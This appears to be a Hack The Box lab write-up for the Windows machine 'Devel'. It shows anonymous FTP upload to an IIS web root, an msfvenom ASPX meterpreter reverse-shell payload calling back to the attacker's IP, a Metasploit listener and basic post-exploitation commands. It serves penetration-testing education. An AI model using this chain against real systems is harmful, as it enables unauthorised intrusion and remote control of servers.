# Dev — Hack The Box

**By Stager** | FashilHack

---
## What is this machine
Devel is an easy Windows machine that demonstrates how **misconfigured FTP + web server integration** can lead to remote code execution.

The goal is:
- Enumerate services
- Abuse anonymous FTP upload
- Gain a shell via web execution

This is a classic example of **file upload → web shell → system access**.

---
## Target

```id="j2l7dw"
IP: <TARGET-IP>
OS: Windows (IIS Web Server)
```

---

## Step 1 — Nmap Scan

Start with full enumeration:

```bash
nmap -A -T4 -p- <TARGET-IP>
```

### Results:

|Port|Service|Version|
|---|---|---|
|21|FTP|Microsoft FTP|
|80|HTTP|Microsoft IIS|

👉 Two key findings:

- FTP allows **anonymous login**
- Web server is **IIS (supports ASP/ASPX)**

---

📸 **Screenshot to add here:**
- Nmap output showing ports 21 and 80
    

---

## Step 2 — FTP Enumeration

Connect to FTP:

```bash
ftp <TARGET-IP>
```

Login:

```id="z8m3g6"
Username: anonymous
Password: anonymous
```

Check access:

```bash
ls
```

---

### Test File Upload

```bash
put test.txt
```

Now browse:

```
http://<TARGET-IP>/test.txt
```

✔ File is accessible via web

---

👉 This confirms:

**FTP directory = Web root**
🔥 Critical misconfiguration

---

📸 **Screenshot to add here:**
- FTP upload success
- test.txt visible in browser

---
## Step 3 — Generate Reverse Shell

Since the server runs IIS, we use **ASPX payload**.
Generate payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=<YOUR-IP> LPORT=4444 \
-f aspx > exploit.aspx
```

---

## Step 4 — Setup Listener

Start Metasploit:
```bash
msfconsole
```

```bash
use exploit/multi/handler
```

Configure:

```bash
set payload windows/meterpreter/reverse_tcp
set lhost <YOUR-IP>
set lport 4444
run
```

---

📸 **Screenshot to add here:**
- Metasploit listener running

---

## Step 5 — Upload Malicious File
Reconnect to FTP:
```bash
ftp <TARGET-IP>
```

Upload payload:

```bash
put exploit.aspx
```

---
## Step 6 — Trigger Shell

Open in browser:

```
http://<TARGET-IP>/exploit.aspx
```

---
### Result:

Meterpreter session received:

```bash
sessions
sessions -i 1
```

```bash
whoami
```

✔ Initial access gained 🎯

---
📸 **Screenshot to add here:**
- Meterpreter session opened

---
## Step 7 — Post-Exploitation (Basic)

Now you can:
```bash
sysinfo
getuid
```

Explore system and move toward privilege escalation (not required for basic foothold).

---
## Full Attack Chain

```id="m9u8l1"
Nmap → FTP + HTTP discovered
  ↓
Anonymous FTP login
  ↓
Upload test file → confirmed web access
  ↓
Generate ASPX reverse shell
  ↓
Upload exploit.aspx
  ↓
Trigger via browser
  ↓
Meterpreter shell
```

---
## Key Takeaways

**1. Anonymous FTP is dangerous**  
If upload is allowed → potential RCE.

---

**2. Always check web root mapping**  
FTP → Web directory = instant exploitation path.

---

**3. Match payload to technology**  
IIS → use `.aspx`, not `.php`.

---

**4. Simple misconfigurations = full compromise**  
No exploit needed — just upload and execute.

---

_Stager — PNPT Candidate_ _FashilHack — Simulating Attacks, Securing Businesses._

